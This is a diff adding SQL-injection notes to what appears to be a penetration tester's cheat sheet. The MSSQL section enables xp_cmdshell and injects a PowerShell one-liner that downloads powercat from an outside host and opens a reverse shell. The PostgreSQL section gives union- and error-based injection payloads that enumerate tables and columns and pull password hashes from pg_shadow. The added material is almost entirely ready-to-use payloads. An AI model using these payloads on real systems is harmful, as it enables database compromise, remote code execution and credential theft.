@@ -229,4 +229,42 @@ kali@kali:~$ cat fileup.pub > authorized_keys
 - /home/username/.bash_history
 - /home/username/.bash_aliases
 
+# SQLi
+## mssql
+```bash
+';EXEC sp_configure 'show advanced options', 1;--
+';RECONFIGURE;--
+';EXEC sp_configure "xp_cmdshell", 1;--
+';RECONFIGURE;--
+';EXEC xp_cmdshell 'powershell.exe -nop -w hidden -c "IEX ((New-Object Net.WebClient).DownloadString(''http://192.168.45.176/powercat.ps1''))"; powercat -c 192.168.45.176 -p 4444 -e powershell'; --
+```
 
+### postgresql
+```bash
+' order by 7 -- //
+' union select 1, 1, 1, 1, 1, 1 -- //
+' union select 'd', 1, 1, 'd', 'd', null -- //
+
+# Current user
+' union select 'd', cast((SELECT concat('DATABASE: ',current_user)) as int), 1, 'd', 'd', null -- //
+
+# Use cast to cause error to get the database
+' union select 'd', cast((SELECT concat('DATABASE: ',current_database())) as int), 1, 'd', 'd', null -- //
+## ERROR
+<b>Warning</b>:  pg_query(): Query failed: ERROR:  invalid input syntax for type integer: &quot;DATABASE: glovedb&quot; in <b>/var/www/html/class.php</b> on line <b>423</b><br />
+
+# Use case to find out tables
+cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int)
+
+
+# Use cast to find out columns for each table
+cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int)
+
+
+# Use cast to find out row for each column
+cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int)
+
+
+# Get current user's password!
+' union select 'd', cast((SELECT concat('DATABASE: ',passwd) FROM pg_shadow limit 1 offset 1) as int), 1, 'd', 'd', null -- //
+```
